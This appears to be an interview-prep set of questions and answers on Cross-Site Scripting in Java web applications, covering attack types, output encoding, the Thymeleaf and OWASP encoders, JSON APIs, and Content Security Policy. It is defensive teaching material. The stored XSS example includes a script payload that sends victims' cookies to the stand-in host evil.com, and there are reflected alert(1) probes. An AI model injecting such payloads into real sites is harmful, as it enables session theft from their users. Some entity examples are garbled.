question: What is Cross-Site Scripting (XSS) and how does it work?
title: XSS Cross-Site Scripting – Java Backend Security
direct_answer: **XSS (Cross-Site Scripting)** — Attacker injects malicious JavaScript into web pages viewed by other users. The script runs in victims' browsers under your site's trust context — can steal cookies, redirect users, or perform actions on their behalf.

interviewer_intent.common_mistake: Confusing XSS with SQL injection — XSS targets browsers, SQL injection targets databases
interviewer_intent.to_stand_out: Explain stored vs reflected XSS with a concrete example of each

sections.title: XSS Attack Types
sections.content:
**Stored XSS (Persistent):**
- Attacker submits: `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` as a comment
- Server stores it in DB
- Every user who loads the page executes this script
- Most dangerous — persists and affects many users

**Reflected XSS:**
- Attacker crafts URL: `https://site.com/search?q=<script>alert(1)</script>`
- Server reflects input into response without encoding
- Victim must click the malicious link
- Less persistent but still dangerous for phishing

**DOM XSS:**
- JavaScript reads from URL and writes to DOM without sanitization
- Server never sees the payload

**Impact:**
- Cookie/session theft
- Keylogging
- Phishing overlays
- Redirect to malicious sites

sections.title: Key Points
sections.content:
- XSS = injecting scripts into pages viewed by other users
- Stored XSS persists in DB — affects all viewers
- Reflected XSS requires victim to click crafted link
- Fix: output encoding when rendering user data in HTML
- CSP (Content Security Policy) header as additional layer
- Spring's Thymeleaf auto-escapes output — protects by default

sections.title: How to Answer in an Interview
sections.content: XSS is an injection attack targeting browsers, not databases. An attacker embeds malicious JavaScript into content that gets stored in your system — say a forum post or user profile. When another user views that page, your server sends the script as part of the HTML, and the victim's browser executes it in the context of your site. The script has full access to the page, cookies, and can make requests to your API as the victim. The most dangerous form is stored XSS — it persists and affects every user who sees that content. Reflected XSS requires a crafted link and a victim clicking it. The defense is output encoding: when you render user-supplied data into HTML, encode special characters like < and > so they display as text, not execute as code.

question: How do you prevent XSS in a Java web application?
title: XSS Cross-Site Scripting – Java Backend Security
direct_answer: **XSS prevention** — Primary: output encoding when rendering user data in HTML. Use Thymeleaf (auto-escapes) or explicitly encode with StringEscapeUtils. Secondary: Content Security Policy header to restrict script sources. Input validation as an extra layer but not sufficient alone.

interviewer_intent.common_mistake: Relying only on input validation — attackers find encoding bypasses; output encoding at render time is the correct primary defense
interviewer_intent.to_stand_out: Explain why output encoding is preferred over input sanitization and how Thymeleaf makes it automatic

sections.title: XSS Defense Strategy
sections.content:
**Primary defense: Output encoding at render time** ```java // Thymeleaf (auto-escapes by default)

...

// SAFE - auto-encoded

...

// UNSAFE - raw HTML // Manually encode with Apache Commons Text String safe = StringEscapeUtils.escapeHtml4(userInput); // OWASP Java Encoder String safe = Encode.forHtml(userInput); ``` **Context-specific encoding:** - HTML body: `<` for `<` - HTML attribute: additional escaping for quotes - JavaScript: `\x3C` for `<` - URL parameter: percent encoding **Content Security Policy header:** ``` Content-Security-Policy: default-src 'self'; script-src 'self' ``` Tells browsers to only execute scripts from your own domain — inline scripts and external CDN scripts blocked unless explicitly allowed. **Spring Security adds CSP:** ```java http.headers().contentSecurityPolicy("default-src 'self'"); ```

sections.title: Key Points
sections.content:
- Output encoding > input sanitization for XSS prevention
- Thymeleaf's `th:text` auto-escapes — use it everywhere
- `th:utext` renders raw HTML — only use for trusted, pre-sanitized content
- CSP header restricts which scripts can execute
- Spring Security can add security headers including CSP
- OWASP Java Encoder library for manual encoding

sections.title: How to Answer in an Interview
sections.content: The primary defense against XSS is output encoding at render time. When you display user-provided content in HTML, encode the special characters so they're displayed as text, not interpreted as HTML or JavaScript. In Thymeleaf, `th:text` does this automatically — it's the safe default. If you use `th:utext`, you're rendering raw HTML, which is risky unless the content has been pre-sanitized. For manual encoding, OWASP's Java Encoder library is the standard. On top of that, I'd add a Content Security Policy header via Spring Security's headers configuration — this tells browsers to only execute scripts from approved sources, so even if an XSS payload gets through, the browser won't execute scripts from external attacker domains. For REST APIs that only return JSON, XSS is less of a concern since the browser isn't rendering the response as HTML.

question: What is the difference between input sanitization and output encoding?
title: XSS Cross-Site Scripting – Java Backend Security
direct_answer: **Input sanitization** strips/transforms dangerous input before storing. **Output encoding** transforms data at render time so it displays safely in the target context. Output encoding is the correct primary defense — it's context-specific and prevents encoding bypass attacks.

interviewer_intent.testing: Deep understanding of defense mechanisms beyond just knowing they exist
interviewer_intent.common_mistake: Treating input sanitization as sufficient — attackers craft inputs that bypass sanitization; encoding at render is more reliable
interviewer_intent.to_stand_out: Explain that encoding must be context-specific: HTML encoding differs from JavaScript encoding differs from URL encoding

sections.title: Sanitization vs Encoding
sections.content:
**Input Sanitization:**
- Done at input time, before storing
- Example: strip `<script>` tags, remove SQL keywords
- Problems: blacklists are bypassable (`<ScRiPt>`, URL encoding tricks), and you may lose data
- Use for: file uploads (strip executable extensions), rich text (OWASP HTML sanitizer to allow only safe tags)

**Output Encoding:**
- Done at output/render time, specific to the output context
- Example: when putting data into HTML, encode `<` as `<`
- Problems: none — encoding preserves the original data and prevents interpretation
- Use for: all user-supplied data rendered in HTML, attributes, JavaScript, URLs

**Why context matters:**
- In HTML body: encode `<` → `<`
- In HTML attribute: also encode `"` and `'`
- In JavaScript: encode differently — `\x3C`
- In URL: percent encoding

Using HTML encoding in a JavaScript context doesn't protect against XSS.

sections.title: Key Points
sections.content:
- Sanitization at input, encoding at output
- Encoding is the primary XSS defense — sanitization is supplementary
- Context matters: HTML/attribute/JavaScript/URL need different encoding
- Sanitization makes sense for rich text with allowlisted HTML (OWASP HTML Sanitizer)
- Never use string replacement as a sanitization technique for security

sections.title: How to Answer in an Interview
sections.content: Input sanitization and output encoding are complementary but different. Sanitization happens at input time — you strip or transform dangerous content before storing it. The problem with relying on sanitization alone is that blacklists are bypassable: `<ScRiPt>`, HTML entity encoding of the tag, and other tricks can slip through. Output encoding happens at render time — when you're putting data into HTML or JavaScript, you encode characters so they're treated as data, not code. Encoding preserves the original data while making it safe to display. The important nuance is context: encoding for HTML body differs from encoding for HTML attributes, which differs from encoding for JavaScript, which differs from URL parameters. Using the wrong encoding for the context still leaves you vulnerable.

question: Can XSS affect a REST API that only returns JSON?
title: XSS Cross-Site Scripting – Java Backend Security
direct_answer: **REST APIs and XSS** — A JSON REST API is not directly vulnerable to XSS because browsers don't render JSON as HTML. However: if clients use that JSON data in DOM manipulation, the consumer can cause XSS. Also: if Content-Type is wrong and browser renders response as HTML, the API itself can be a vector.

interviewer_intent.testing: Understanding XSS scope across different application architectures
interviewer_intent.common_mistake: Saying 'my API returns JSON so I don't need to worry about XSS' — the JavaScript clients consuming your API may be vulnerable
interviewer_intent.to_stand_out: Explain that the API consumer's use of the JSON data is where the XSS risk lives, not the API response itself

sections.title: XSS in REST API Context
sections.content:
**Why JSON APIs are generally safer:**
- Browsers don't execute JSON as HTML
- Content-Type: application/json prevents HTML rendering
- No Thymeleaf template rendering

**Where risk still exists:**
1. **Client-side DOM manipulation**: `document.getElementById('name').innerHTML = user.name` — if your API returns XSS payload in name, the JavaScript client executes it
2. **Wrong Content-Type**: if your API accidentally returns `text/html` instead of `application/json`, browser renders it as HTML
3. **JSONP (legacy)**: returns JavaScript that browsers execute
4. **Swagger/API docs**: if they render user data in the browser

**Best practices for REST APIs:**
- Always set `Content-Type: application/json`
- Never use `innerHTML` on the consumer side — use `textContent`
- Return sanitized data for fields that will be rendered in HTML contexts

sections.title: Key Points
sections.content:
- JSON APIs don't directly execute XSS — browsers don't interpret JSON as HTML
- The risk is in how API consumers use the JSON data in the DOM
- Always set Content-Type: application/json explicitly
- Never use innerHTML with API data on the frontend
- Spring: Jackson automatically serializes to JSON with proper Content-Type

sections.title: How to Answer in an Interview
sections.content: A REST API returning JSON isn't directly vulnerable to XSS — browsers don't render JSON as HTML and won't execute scripts in a JSON payload. However, the story doesn't end there. The JavaScript client consuming your API determines whether that data is safe to render. If the frontend code does `element.innerHTML = apiResponse.username`, and your API returns a username like `<script>alert(1)</script>`, the browser executes it when the frontend sets innerHTML. So the XSS vulnerability is in the consumer's DOM manipulation, not in the API itself — but you stored and returned the payload. Best practices: always set Content-Type to application/json explicitly, so browsers never misinterpret the response; and communicate to frontend teams that innerHTML should never be used with untrusted data — use textContent instead.

question: What is Content Security Policy and how does it mitigate XSS?
title: XSS Cross-Site Scripting – Java Backend Security
direct_answer: **Content Security Policy (CSP)** — An HTTP response header that tells browsers which sources of scripts, styles, and media are trusted. Even if an XSS payload executes, CSP can block scripts from unauthorized sources. It's a defense-in-depth layer, not a replacement for output encoding.

interviewer_intent.testing: Knowledge of browser-level security controls beyond server-side coding
interviewer_intent.common_mistake: Thinking CSP replaces output encoding — it's an additional layer, not a substitute
interviewer_intent.to_stand_out: Give a concrete CSP header value and explain what each directive does

sections.title: CSP as XSS Defense Layer
sections.content:
**How CSP works:**
The server sends a CSP header. The browser reads it and enforces the policy — blocking any resource load or script execution that violates the policy.

**Example CSP header:**
```
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://cdn.jsdelivr.net; 
  style-src 'self' 'unsafe-inline'; 
  img-src 'self' data:; 
  object-src 'none';
```

**Directives:**
- `default-src 'self'`: only load resources from same origin by default
- `script-src 'self'`: only execute scripts from same origin
- `'unsafe-inline'`: allows inline scripts — AVOID THIS, negates XSS protection
- `'nonce-xxxx'`: allows specific inline scripts with matching nonce
- `object-src 'none'`: blocks all plugins

**Spring Security CSP:**
```java
http.headers()
  .contentSecurityPolicy("default-src 'self'; script-src 'self'");
```

**CSP limitations:**
- Doesn't stop XSS where attacker loads scripts from an allowed domain
- Inline event handlers (`onclick=`) are blocked by default — good
- Report-only mode: `Content-Security-Policy-Report-Only` for testing

sections.title: Key Points
sections.content:
- CSP tells browsers which script sources are trusted
- Blocks inline scripts by default — attackers can't inject `<script>` tags
- Does not replace output encoding — it's a second layer
- 'unsafe-inline' in script-src breaks XSS protection
- Use nonce-based CSP for legitimate inline scripts
- Spring Security: .contentSecurityPolicy() method

sections.title: How to Answer in an Interview
sections.content: Content Security Policy is an HTTP response header that gives browsers a whitelist of trusted script sources. The browser enforces it — even if an XSS payload gets injected into the page, if the script comes from an untrusted source, the browser blocks it. A policy like `script-src 'self'` means only scripts hosted on your own domain can execute — an attacker's external script host is blocked. The critical mistake is adding `'unsafe-inline'` to script-src — this allows inline scripts like `<script>` tags and event handlers, which completely breaks XSS protection. In Spring Security, I configure CSP via `.contentSecurityPolicy()`. I think of CSP as a safety net: output encoding is the primary defense, CSP is the backup in case something slips through.
